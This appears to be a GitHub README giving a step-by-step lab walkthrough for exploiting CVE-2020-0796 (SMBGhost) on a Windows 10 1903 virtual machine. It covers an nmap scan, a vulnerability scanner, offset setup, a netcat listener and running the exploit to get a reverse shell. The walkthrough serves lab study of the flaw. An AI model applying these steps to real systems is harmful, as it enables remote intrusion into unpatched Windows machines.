# README

# Author **Abdullah Iqbal**

Install **windows 10 version 1903** on a virtual machine.

Run both kali and win 10 on the same **Nat network**.

Scan the windows using the nmap on kali to see which ports are open on the virtual windows.
    1. `sudo nmap -sS <Ip address>`
    2. We can see that port **445** is open, that what we need.

On kali terminal clone the GitHub repository and run the script file to see weather the install windows version is vulnerable or not using the python script.
    1. Git clone https://github.com/abdullah098/CVE_2020_0796
    2. `Python3 Scanner.py <Ip address>`
 
    If the terminal shows **Vulnerable** then the installed version of win 10 is vulnerable, otherwise, start from step 1 again. 
 
Run offsets.bat on the target machine to get the offset of windows and replace the offset that you get from windows into the CVE_2020_0796.py file.
 
Now we must make a listening port on the kali so that we can listen to the incoming communication.
    1. `nc -lvp <port number>`
 
Now we have to run the SMBleedingGhost.py file using the command.
    1. `CVE_2020_0796.py <target ip> <reverse_shell_ip> <reverse_shell_port>`
    2. We will receive an error after this step because of **windll**. This occurs because kali doesn’t have any windll file.
 
Make another win 10 Virtual machine and run it on same **NAT networ**. 

Then we will run the exploit on that machine and will redirect that to the kali listening port we started at step 7.
    1. Start Win 10 on same NAT network
    2. Install python
    3. Resetup the offset
    4. Run `CVE_2020_0796.py <target ip> <reverse_shell_ip> <reverse_shell_port>`
